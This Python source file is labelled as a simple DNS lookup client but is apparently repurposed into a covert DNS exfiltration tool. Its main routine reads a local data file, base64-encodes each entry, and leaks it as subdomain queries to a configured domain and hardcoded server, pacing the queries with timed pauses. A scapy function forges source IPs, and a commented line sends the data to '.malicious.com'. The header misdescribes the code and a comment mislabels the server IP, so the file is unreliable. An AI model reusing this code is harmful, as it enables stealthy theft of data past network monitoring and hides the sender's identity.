#!/usr/bin/env python

"""
Python DNS Client
(C) 2014 David Lettier
lettier.com
A simple DNS client similar to `nslookup` or `host`.
Does not use any DNS libraries.
Handles only A type records.
"""

import codecs
import base64
import sys
import socket
import time
import bitstring , struct # For constructing and destructing the DNS packet.
from scapy.all import *


def to_hex_string(x):
  """
  Encodes either a positive integer or string to its hexadecimal representation.
  """
  result = "0"
  if x.__class__.__name__ == "int" and x >= 0:
    result = hex(x)
    if x < 16:
      result = "0" + result[2:]
  elif x.__class__.__name__ == "str":
    result = "".join([hex(ord(y))[2:] for y in x])
  return "0x" + result


try:
  conf = open('configuration file.txt', 'r')
  confDictionary = {}
  for line in conf.readlines():
    line = line.replace("\n", "")
    splited = line.split('=')
    confDictionary[splited[0]]=splited[1]
  conf.close()

  SECONDS_BETWEEN_QUERIES = confDictionary.get("seconds_between_query")
  METHOD = confDictionary.get("method")
  DOMAIN_NAME = confDictionary.get("domain_name")
  DNS_IP = confDictionary.get("dns_server_ip")
  PATH_TO_DATA_FILE = confDictionary.get("path_to_data_file")
except:
  print("configuration file not found")

DNS_ID_COUNT = 0

#This method sends a dns query with spoofed ip to our destination server
#The query wonwt get response back

def spoofed_dns_query(source_ip_addr , des_ip_addr ,des_port, query):
  pct = IP(src=source_ip_addr, dst=des_ip_addr) / UDP( dport=des_port) / DNS(rd=1, qd=DNSQR(qname=query), id=DNS_ID_COUNT)
  DNS_ID_COUNT = (DNS_ID_COUNT+1)%65536
  send(pct)

def is_valid_ipv4_address(address):
  try:
    socket.inet_pton(socket.AF_INET, address)
  except AttributeError:  # no inet_pton here, sorry
    try:
      socket.inet_aton(address)
    except socket.error:
      return False
    return address.count('.') == 3
  except socket.error:  # not a valid address
    return False

  return True

#This method returns a list of local DNS servers IPs
def get_windows_dns_ips():
  output = subprocess.check_output(["ipconfig", "-all"])
  output = str(output)
  ipconfig_all_list = output.split('\\r\\n')

  dns_ips = []
  for i in range(0, len(ipconfig_all_list)):
    if "DNS Servers" in ipconfig_all_list[i]:
      # get the first dns server ip
      first_ip = ipconfig_all_list[i].split(":")[1].strip()
      if not is_valid_ipv4_address(first_ip):
        continue
      dns_ips.append(first_ip)
      # get all other dns server ips if they exist
      k = i + 1
      while k < len(ipconfig_all_list) and ":" not in ipconfig_all_list[k]:
        ip = ipconfig_all_list[k].strip()
        if is_valid_ipv4_address(ip):
          dns_ips.append(ip)
        k += 1
      # at this point we're done
      break
  return dns_ips


def resolve_host_name(host_name_to):
  """
  Queries the DNS A record for the given host name and returns the result.
  """

  host_name_to = host_name_to.split(".")

  # Construct the DNS packet consisting of header + QNAME + QTYPE + QCLASS.

  DNS_QUERY_FORMAT = [
      "hex=id"
    , "bin=flags"
    , "uintbe:16=qdcount"
    , "uintbe:16=ancount"
    , "uintbe:16=nscount"
    , "uintbe:16=arcount"
  ]

  DNS_QUERY = {
      "id": "0x1a2b"
    , "flags": "0b0000000100000000" # Standard query. Ask for recursion.
    , "qdcount": 1 # One question.
    , "ancount": 0
    , "nscount": 0
    , "arcount": 0
  }

  # Construct the QNAME:
  # size|label|size|label|size|...|label|0x00

  j = 0

  for i, _ in enumerate(host_name_to):

    host_name_to[i] = host_name_to[i].strip()

    DNS_QUERY_FORMAT.append("hex=" + "qname" + str(j))


    DNS_QUERY["qname" + str(j)] = to_hex_string(len(host_name_to[i]))

    j += 1

    DNS_QUERY_FORMAT.append("hex=" + "qname" + str(j))

    DNS_QUERY["qname" + str(j)] = to_hex_string(host_name_to[i])

    j += 1

  # Add a terminating byte.

  DNS_QUERY_FORMAT.append("hex=qname" + str(j))

  DNS_QUERY["qname" + str(j)] = to_hex_string(0)

  # End QNAME.

  # Set the type and class now.

  DNS_QUERY_FORMAT.append("uintbe:16=qtype")

  DNS_QUERY["qtype"] = 1 # For the A record.

  DNS_QUERY_FORMAT.append("hex=qclass")

  DNS_QUERY["qclass"] = "0x0001" # For IN or Internet.

  # Convert the struct to a bit string.

  data = bitstring.pack(",".join(DNS_QUERY_FORMAT), **DNS_QUERY)

  # Send the packet off to the server.

  DNS_IP = "141.226.242.178" # Google public DNS server IP.

  DNS_PORT = 5053 # DNS server port for queries.

  READ_BUFFER = 1024 # The size of the buffer to read in the received UDP packet.

  address = (DNS_IP, DNS_PORT) # Tuple needed by sendto.

  client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)# Internet, UDP.

  print(data.tobytes)
  client.sendto(data.tobytes(), address) # Send the DNS packet to the server using the port.

  # Get the response DNS packet back, decode, and print out the IP.

  # Get the response and put it in data. Get the responding server address and put it in address.

  data, address = client.recvfrom(READ_BUFFER)

  # Convert data to bit string.

  data = bitstring.BitArray(bytes=data)

  # Unpack the receive DNS packet and extract the IP the host name resolved to.

  # Get the host name from the QNAME located just past the received header.

  host_name_from = []

  # First size of the QNAME labels starts at bit 96 and goes up to bit 104.
  # size|label|size|label|size|...|label|0x00

  x = 96
  y = x + 8

  for i, _ in enumerate(host_name_to):

    # Based on the size of the very next label indicated by
    # the 1 octet/byte before the label, read in that many
    # bits past the octet/byte indicating the very next
    # label size.

    # Get the label size in hex. Convert to an integer and times it
    # by 8 to get the number of bits.

    increment = (int(str(data[x:y].hex), 16) * 8)

    x = y
    y = x + increment

    # Read in the label, converting to ASCII.

    host_name_from.append(codecs.decode(data[x:y].hex, "hex_codec").decode())

    # Set up the next iteration to get the next label size.
    # Assuming here that any label size is no bigger than
    # one byte.

    x = y
    y = x + 8 # Eight bits to a byte.

  # Get the response code.
  # This is located in the received DNS packet header at
  # bit 28 ending at bit 32.

  response_code = str(data[28:32].hex)

  result = {'host_name': None, 'ip_address': None}

  # Check for errors.

  if (response_code == "0"):

    result['host_name'] = ".".join(host_name_from)

    # Assemble the IP address the host name resolved to.
    # It is usually the last four octets of the DNS
    # packet--at least for A records.

    result['ip_address'] = ".".join([
        str(data[-32:-24].uintbe)
      , str(data[-24:-16].uintbe)
      , str(data[-16:-8].uintbe)
      , str(data[-8:].uintbe)
    ])

  elif (response_code == "1"):

    print("\nFormat error. Unable to interpret query.\n")

  elif (response_code == "2"):

    print("\nServer failure. Unable to process query.\n")

  elif (response_code == "3"):

    print("\nName error. Domain name does not exist.\n")

  elif (response_code == "4"):

    print("\nQuery request type not supported.\n")

  elif (response_code == "5"):

    print("\nServer refused query.\n")

  return result


def get_file_to_transfer(path):
  toReturn = []
  try:
    f = open(path , 'r')
    for line in f.readlines():
      line = line.replace("\n","")
      toReturn.append(line)
    f.close()
    return toReturn
  except:
    return toReturn


def get_Base64_qeury(word):
  message = word
  message_bytes = message.encode('ascii')
  base64_bytes = base64.b64encode(message_bytes)
  base64_message = base64_bytes.decode('ascii')
  return base64_message




if __name__ == "__main__":

  data_file = get_file_to_transfer(PATH_TO_DATA_FILE)
  try:
    if METHOD == "domain_based64":
      for line in data_file:
        splited = line.split(",")
        for word in splited:
          word=word.strip(" ")
          word64=get_Base64_qeury(word)
          resolve_host_name(word64+"."+str(DOMAIN_NAME))
          time.sleep(int(SECONDS_BETWEEN_QUERIES))
  except Exception as e:
    pass


  # file = get_file_to_transfer()
  # for line in file:
  #   splited = line.split(",")
  #   for word in splited:
  #     word64=get_Base64_qeury(word)
  #     resolve_host_name(word64+".malicious.com")


  # Get the host name from the command line.
  # spoofed_dns_query("111.111.111.111","141.226.242.178",5053,"aaa.com")
  # HOST_NAME = "google.com"

# ### ORIGINAL CODE
#       # try:
#       #
#       #   HOST_NAME = sys.argv[1]
#       #
#       # except IndexError:
#       #
#       #   print("No host name specified.")
#       #
#       #   sys.exit(0)
#       #   result = resolve_host_name(HOST_NAME)
#       #
#       #   print("\nHost Name:\n" + str(result['host_name']))
#       #   print("\nIP Address:\n" + str(result['ip_address']) + "\n")
#
  # while True :
  #
  #   result = resolve_host_name(HOST_NAME)
  #
  #   print("\nHost Name:\n" + str(result['host_name']))
  #   print("\nIP Address:\n" + str(result['ip_address']) + "\n")
  #   time.sleep(10)


